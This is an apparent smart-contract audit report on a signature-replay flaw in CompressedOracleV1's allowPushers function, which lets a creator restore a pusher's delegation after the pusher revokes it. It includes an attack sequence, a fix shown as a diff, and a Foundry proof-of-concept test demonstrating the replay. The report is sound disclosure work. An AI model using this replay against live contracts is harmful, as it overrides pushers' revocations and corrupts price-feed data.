### Title
Pusher Consent Signature Replay Within Deadline Window Lets Creator Undo Revocation — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`CompressedOracleV1.allowPushers` uses a deadline-bounded EIP-191 signature as the pusher's consent, but there is no nonce or used-signature tracking. A creator who holds a valid, unexpired pusher consent signature can call `allowPushers` repeatedly with the same signature to re-establish delegation immediately after the pusher calls `revokePusher()`. The pusher's self-revocation is therefore not permanent within the deadline window, violating the invariant the code comment explicitly claims the deadline enforces.

---

### Finding Description

`allowPushers` hashes `(block.chainid, address(this), deadline, pusher, msg.sender)` and recovers the signer: [1](#0-0) 

The code comment acknowledges the replay risk and claims the deadline mitigates it: [2](#0-1) 

However, the deadline only prevents replay **after** it expires. Within the deadline window the same signature is accepted an unlimited number of times. `revokePusher` clears `namespaceRemapping[msg.sender]`: [3](#0-2) 

But there is nothing that invalidates the already-issued signature. The creator can immediately call `allowPushers` again with the same `(deadline, pusher, signature)` tuple and restore `namespaceRemapping[pusher] = msg.sender`.

**Attack sequence:**

1. Pusher signs consent for creator with `deadline = now + N days`.
2. Creator calls `allowPushers` → `namespaceRemapping[pusher] = creator`.
3. Pusher calls `revokePusher()` → `namespaceRemapping[pusher] = address(0)`.
4. Creator immediately replays the same signature via `allowPushers` → `namespaceRemapping[pusher] = creator` again.
5. Steps 3–4 can be repeated indefinitely until the deadline expires.

After step 4, any fallback push from the pusher lands in the creator's namespace: [4](#0-3) 

---

### Impact Explanation

The pusher's self-revocation is the only on-chain mechanism a pusher has to stop their data from flowing into a creator's namespace. If the creator can undo it at will, the pusher cannot reliably detach. A pusher who revokes because they are compromised, shutting down, or switching to their own namespace will find their subsequent pushes still landing in the creator's namespace. This constitutes a **delegation cleanup failure**: stale write authority survives revocation and continues to mutate production feed data consumed by pools via `price()` → `AnchoredPriceProvider` → `getBidAndAskPrice()`.

---

### Likelihood Explanation

The creator already holds the pusher's consent signature (they used it to establish delegation). Replaying it requires a single additional transaction with no new information. Any creator who wants to retain a pusher's data flow against the pusher's will can do so trivially for the full duration of the deadline window (which can be set to any future timestamp at signing time).

---

### Recommendation

Track consumed signatures with a per-pusher nonce or a `usedSignatures` mapping, and invalidate the signature on first use:

```diff
+ mapping(bytes32 => bool) private _usedConsents;

function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
    _ensureDeadline(deadline);
    ...
    bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
        keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
    );
    require(pusher == ECDSA.recover(hash, signatures[i]));
+   require(!_usedConsents[hash], SignatureAlreadyUsed());
+   _usedConsents[hash] = true;

    namespaceRemapping[pusher] = msg.sender;
    emit PusherAuthorized(pusher, msg.sender);
}
```

Alternatively, require the pusher to re-sign a new consent (with a fresh nonce or a higher deadline) each time delegation is re-established after a revocation.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {CompressedOracleV1} from "contracts/oracles/compressed/CompressedOracle.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

contract ReplayTest is Test {
    CompressedOracleV1 oracle;
    uint256 constant PUSHER_KEY = 0xBEEF;
    address pusher;
    address creator = address(0xC0FFEE);

    function setUp() public {
        oracle = new CompressedOracleV1(address(this), 0);
        pusher = vm.addr(PUSHER_KEY);
        vm.warp(1_700_000_000);
    }

    function testReplayAfterRevoke() public {
        uint256 deadline = block.timestamp + 1 days;

        // Pusher signs consent once
        bytes32 digest = MessageHashUtils.toEthSignedMessageHash(
            keccak256(abi.encode(block.chainid, address(oracle), deadline, pusher, creator))
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(PUSHER_KEY, digest);
        bytes memory sig = abi.encodePacked(r, s, v);

        address[] memory pushers = new address[](1);
        pushers[0] = pusher;
        bytes[] memory sigs = new bytes[](1);
        sigs[0] = sig;

        // Creator establishes delegation
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs);
        assertEq(oracle.namespaceRemapping(pusher), creator);

        // Pusher revokes
        vm.prank(pusher);
        oracle.revokePusher();
        assertEq(oracle.namespaceRemapping(pusher), address(0));

        // Creator replays the SAME signature — delegation restored
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs); // should revert but does not
        assertEq(oracle.namespaceRemapping(pusher), creator, "revocation bypassed by replay");
    }
}
```

    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
        _ensureDeadline(deadline);

        uint256 l = pushers.length;
        require(l == signatures.length);
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
